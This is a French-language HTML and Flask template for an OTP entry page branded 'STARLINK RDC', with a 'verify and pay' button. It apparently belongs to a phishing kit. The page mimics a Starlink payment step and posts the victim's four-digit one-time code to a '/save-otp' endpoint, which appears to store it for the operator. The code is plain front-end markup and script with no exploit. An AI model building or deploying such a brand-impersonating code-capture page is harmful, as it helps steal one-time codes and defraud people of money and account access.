<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification OTP - STARLINK RDC</title>
</head>
<body>

<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: Arial, Helvetica, sans-serif;
    }

    body {
        background: #f0f2f5;
        min-height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 20px;
    }

    .card {
        background: white;
        border-radius: 16px;
        width: 100%;
        max-width: 380px;
        overflow: hidden;
        box-shadow: 0 8px 25px rgba(0,0,0,0.12);
        text-align: center;
    }

    .header {
        background: #d32f2f;
        color: white;
        padding: 40px 20px 30px;
        position: relative;
    }

    .header h2 {
        font-size: 1.5rem;
        margin: 0;
        text-transform: uppercase;
        letter-spacing: 1px;
    }

    .icon-placeholder {
        width: 80px;
        height: 80px;
        background: white;
        margin: 0 auto 20px;
        border-radius: 12px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 2.5rem;
    }

    .content {
        padding: 30px 24px;
    }

    .title {
        font-size: 1.4rem;
        font-weight: bold;
        margin-bottom: 12px;
        color: #333;
    }

    .subtitle {
        color: #555;
        margin-bottom: 8px;
    }

    .phone {
        font-size: 1.3rem;
        font-weight: bold;
        color: #d32f2f;
        margin-bottom: 30px;
    }

    .otp-label {
        font-size: 1.1rem;
        color: #444;
        margin-bottom: 20px;
    }

    .otp-boxes {
        display: flex;
        justify-content: center;
        gap: 12px;
        margin-bottom: 30px;
    }

    .otp-box {
        width: 45px;
        height: 55px;
        border: 2px solid #ddd;
        border-radius: 12px;
        font-size: 1.8rem;
        text-align: center;
        background: #fafafa;
        transition: all 0.2s;
    }

    .otp-box:focus {
        border-color: #d32f2f;
        outline: none;
        box-shadow: 0 0 0 3px rgba(211,47,47,0.2);
    }

    .btn-verify {
        width: 100%;
        padding: 16px;
        background: #d32f2f;
        color: white;
        border: none;
        border-radius: 12px;
        font-size: 1.2rem;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.3s;
    }

    .btn-verify:hover {
        background: #b71c1c;
    }

    .btn-verify:disabled {
        background: #e57373;
        cursor: not-allowed;
    }
</style>

<div class="card">
    <div class="header">
        <div class="icon-placeholder">□</div>
        <h2>VÉRIFICATION REQUISE</h2>
    </div>

    <div class="content">
        <p class="title">Vérification Requise</p>

        <p class="subtitle">Entrez le code OTP</p>
        <p class="otp-label">Un code à 4 chiffres a été envoyé au</p>
        <p class="phone">{{ phone }}</p>  <!-- e.g. +243 756789789 -->

        <form action="/save-otp" method="POST" id="otpForm">
            <div class="otp-boxes">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="\d" autofocus required>
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="\d" required>
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="\d" required>
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="\d" required>
            </div>

            <!-- Hidden field to send combined OTP to Flask -->
            <input type="hidden" name="otp" id="otpCombined">

            <button type="submit" class="btn-verify" id="verifyBtn">VÉRIFIER ET PAYER</button>
        </form>
    </div>
</div>

<script>
    const boxes = document.querySelectorAll('.otp-box');
    const otpCombined = document.getElementById('otpCombined');
    const form = document.getElementById('otpForm');
    const btn = document.getElementById('verifyBtn');

    // Auto-focus next box + combine values
    boxes.forEach((box, idx) => {
        box.addEventListener('input', (e) => {
            const val = e.target.value;
            if (val.length === 1 && !isNaN(val)) {
                if (idx < 3) boxes[idx + 1].focus();
            } else {
                e.target.value = ''; // only allow digits
            }

            // Update hidden field
            otpCombined.value = Array.from(boxes).map(b => b.value).join('');
        });

        // Backspace → previous box
        box.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' && box.value === '' && idx > 0) {
                boxes[idx - 1].focus();
            }
        });

        // Optional: paste full code
        box.addEventListener('paste', (e) => {
            e.preventDefault();
            const paste = (e.clipboardData || window.clipboardData).getData('text').trim();
            if (/^\d{4}$/.test(paste)) {
                paste.split('').forEach((digit, i) => {
                    if (i < 4) boxes[i].value = digit;
                });
                otpCombined.value = paste;
                boxes[3].focus(); // or submit if you want
            }
        });
    });

    // Optional: disable button until 4 digits (good UX)
    function checkOtp() {
        btn.disabled = otpCombined.value.length !== 4;
    }
    boxes.forEach(box => box.addEventListener('input', checkOtp));
    checkOtp(); // initial check
</script>

</body>
</html>
